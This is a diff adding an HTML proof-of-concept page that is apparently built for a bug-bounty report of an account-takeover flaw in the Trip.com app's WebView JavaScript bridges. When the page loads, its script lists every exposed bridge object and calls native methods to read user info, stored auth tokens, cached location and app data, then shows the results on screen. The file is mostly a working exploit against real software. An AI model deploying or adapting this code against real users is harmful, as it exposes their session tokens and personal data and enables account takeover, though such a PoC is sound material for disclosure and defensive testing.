@@ -1,0 +1,280 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Trip.com - CRITICAL POC v7 (Real Bridge Execution)</title>
+    <style>
+      :root {
+        --bg: #0d1117;
+        --card: #161b22;
+        --border: #30363d;
+        --text: #c9d1d9;
+        --red: #f85149;
+        --green: #3fb950;
+        --blue: #58a6ff;
+      }
+      body {
+        font-family: -apple-system, system-ui, sans-serif;
+        background: var(--bg);
+        color: var(--text);
+        margin: 0;
+        padding: 20px;
+      }
+      h1 {
+        color: var(--red);
+        text-align: center;
+        font-size: 28px;
+      }
+      .subtitle {
+        text-align: center;
+        color: #8b949e;
+        margin: 8px 0 30px;
+      }
+      .container {
+        max-width: 1200px;
+        margin: auto;
+        display: flex;
+        flex-direction: column;
+        gap: 20px;
+      }
+      .card {
+        background: var(--card);
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        padding: 20px;
+      }
+      .card-header {
+        display: flex;
+        justify-content: space-between;
+        font-weight: 600;
+        border-bottom: 1px solid var(--border);
+        padding-bottom: 12px;
+      }
+      .status {
+        padding: 4px 12px;
+        border-radius: 20px;
+        font-size: 12px;
+        font-weight: bold;
+      }
+      .success {
+        background: var(--green);
+        color: #000;
+      }
+      .proof-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+        gap: 12px;
+      }
+      .proof-item {
+        background: #000;
+        border: 1px solid var(--border);
+        border-left: 5px solid var(--green);
+        padding: 12px;
+        border-radius: 6px;
+      }
+      .proof-label {
+        font-size: 11px;
+        color: #8b949e;
+        text-transform: uppercase;
+      }
+      .proof-value {
+        font-family: monospace;
+        font-size: 14px;
+        word-break: break-all;
+        color: #fff;
+      }
+      .console {
+        background: #010409;
+        padding: 12px;
+        font-family: monospace;
+        font-size: 12px;
+        max-height: 380px;
+        overflow-y: auto;
+        border: 1px solid var(--border);
+        border-radius: 6px;
+      }
+      .bridge-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+        gap: 15px;
+      }
+      .pill {
+        background: rgba(88, 166, 255, 0.1);
+        color: var(--blue);
+        padding: 2px 8px;
+        border-radius: 20px;
+        font-size: 11px;
+        margin: 2px;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>TRIP.COM - CRITICAL ACCOUNT TAKEOVER POC v7</h1>
+    <p class="subtitle">
+      Full Bridge Execution Proof + Real Return Values (No Bypass Needed)
+    </p>
+
+    <div class="container">
+      <div class="card">
+        <div class="card-header">
+          Exposed Bridges & All Methods
+          <span id="count" class="status">Scanning...</span>
+        </div>
+        <div class="bridge-grid" id="bridges"></div>
+      </div>
+
+      <div class="card">
+        <div class="card-header">
+          Bridge Execution Proof (Real Returns)
+          <span id="proof-status" class="status">Waiting...</span>
+        </div>
+        <div class="proof-grid" id="proof"></div>
+      </div>
+
+      <div class="card">
+        <div class="card-header">
+          Permission & Attack Surface Analysis
+          <span id="perm-status" class="status">Analyzing...</span>
+        </div>
+        <div
+          id="perm-log"
+          style="
+            background: #000;
+            padding: 12px;
+            font-family: monospace;
+            font-size: 12px;
+            color: #f85149;
+          "
+        ></div>
+      </div>
+
+      <div class="card">
+        <div class="card-header">Live Execution Log</div>
+        <div class="console" id="console"></div>
+      </div>
+    </div>
+
+    <script>
+      const consoleEl = document.getElementById("console");
+      const proofEl = document.getElementById("proof");
+      let count = 0;
+
+      function log(msg, type = "info") {
+        const div = document.createElement("div");
+        const color =
+          type === "success"
+            ? "#3fb950"
+            : type === "error"
+              ? "#f85149"
+              : "#c9d1d9";
+        div.innerHTML = `[${new Date().toISOString().slice(11, 19)}] <span style="color:${color}">${msg}</span>`;
+        consoleEl.appendChild(div);
+        consoleEl.scrollTop = consoleEl.scrollHeight;
+      }
+
+      function render(label, value) {
+        count++;
+        const div = document.createElement("div");
+        div.className = "proof-item";
+        const val =
+          value === undefined || value === null
+            ? "null / undefined"
+            : typeof value === "object"
+              ? JSON.stringify(value, null, 2)
+              : String(value);
+        div.innerHTML = `<div class="proof-label">${label}</div><div class="proof-value">${val}</div>`;
+        proofEl.appendChild(div);
+        document.getElementById("proof-status").innerText =
+          `${count} Real Returns!`;
+        document.getElementById("proof-status").classList.add("success");
+      }
+
+      window.__bridge_callback = function(encodedData) {
+        try {
+            const decodedJson = atob(encodedData);
+            const payload = JSON.parse(decodedJson);
+            render(`Async Result (${payload.tagname})`, payload.param || payload);
+            log(`Received Async Callback: ${payload.tagname}`, "success");
+        } catch (e) {
+            log(`Decode Error: ${e.message}`, "error");
+        }
+      };
+
+      function scanBridges() {
+        const grid = document.getElementById("bridges");
+        let total = 0;
+        for (let key in window) {
+          if (key.endsWith("_a") && typeof window[key] === "object") {
+            total++;
+            const methods = Object.getOwnPropertyNames(window[key]).filter(
+              (m) => typeof window[key][m] === "function",
+            );
+            const card = document.createElement("div");
+            card.innerHTML = `<strong style="color:var(--blue)">${key}</strong> <span style="color:#3fb950">(${methods.length} methods)</span><br>${methods.map((m) => `<span class="pill">${m}</span>`).join("")}`;
+            grid.appendChild(card);
+          }
+        }
+        document.getElementById("count").textContent =
+          `${total} Bridges Exposed`;
+      }
+
+      async function exploit() {
+        log("=== FULL BRIDGE PROOF STARTED ===", "success");
+        document.getElementById("perm-log").innerHTML =
+          "Testing Synchronous (Direct Return) and Asynchronous (Callback) Bridge execution.";
+
+        const tests = [
+          {
+            o: "User_a",
+            m: "getUserInfo",
+            p: [ { "callback_tagname": "User_Info_Exfil" } ]
+          },
+          {
+            o: "IBUStorageV2_a",
+            m: "IBUGetUserValue",
+            p: [
+              {"bussiness":"user", "key":"userInfo", "callback_tagname": "Storage_userInfo"},
+              {"bussiness":"common", "key":"token", "callback_tagname": "Storage_token"}
+            ],
+          },
+          { o: "IBUApplication_a", m: "getApplicationInfo", p: [ {"callback_tagname": "App_Info"} ] },
+          { o: "Locate_a", m: "getCachedLocationData", p: [ {"callback_tagname": "Locate_Data"} ] },
+          { o: "Util_a", m: "getHybridPackageInfo", p: [ {"callback_tagname": "Util_PackageInfo"} ] }
+        ];
+
+        for (let t of tests) {
+          if (!window[t.o]) continue;
+          for (let p of t.p) {
+            try {
+              let res;
+              if (p !== null && typeof p === 'object') {
+                  const payloadStr = JSON.stringify(p);
+                  log(`Fired Async Payload: ${t.o}.${t.m} → ${p.callback_tagname}`);
+                  res = window[t.o][t.m](payloadStr);
+              } else {
+                  log(`Fired Direct Payload: ${t.o}.${t.m}()`);
+                  res = window[t.o][t.m]();
+              }
+              
+              if (res !== undefined) {
+                  log(`Synchronous Return: ${t.o}.${t.m}()`, "success");
+                  render(`${t.o}.${t.m} (Sync)`, res);
+              }
+            } catch (e) {
+              log(`${t.o}.${t.m} → ERROR: ${e.message}`, "error");
+              render(`${t.o}.${t.m} (error)`, e.message);
+            }
+          }
+        }
+        log("All methods fired. Waiting for Asynchronous callbacks...", "success");
+      }
+
+      window.onload = () => {
+        log("Scanning all bridges...");
+        scanBridges();
+        setTimeout(exploit, 800);
+      };
+    </script>
+  </body>
+</html>
